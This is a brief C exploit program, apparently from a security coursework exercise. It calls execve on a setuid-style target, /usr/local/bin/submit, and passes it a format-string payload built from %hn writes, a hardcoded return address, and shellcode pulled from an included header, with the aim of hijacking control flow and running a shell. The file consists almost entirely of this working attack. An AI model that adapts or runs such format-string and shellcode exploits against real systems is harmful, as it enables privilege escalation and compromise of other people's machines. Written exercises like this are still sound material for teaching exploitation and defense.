/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit"
#define FINALNAME "%100$.57240u%279$hn%100$.8199u%280$hn  "
#define HACK "\xfc\xdd\xbf\xff\xfe\xdd\xbf\xff" // the return address when it's in the function

int main(void)
{
  int i, pid, status;
  char *args[5];
  char *env[1];
  char is[4];
   
  args[0] = FINALNAME;
  args[1] = HACK;
  args[2] = "-v";
  args[3] = shellcode;
  args[4] = NULL;

  env[0] = NULL;
  
  if (execve(TARGET, args, env) < 0)
        fprintf(stderr, "execve failed.\n");
  exit(0);
}
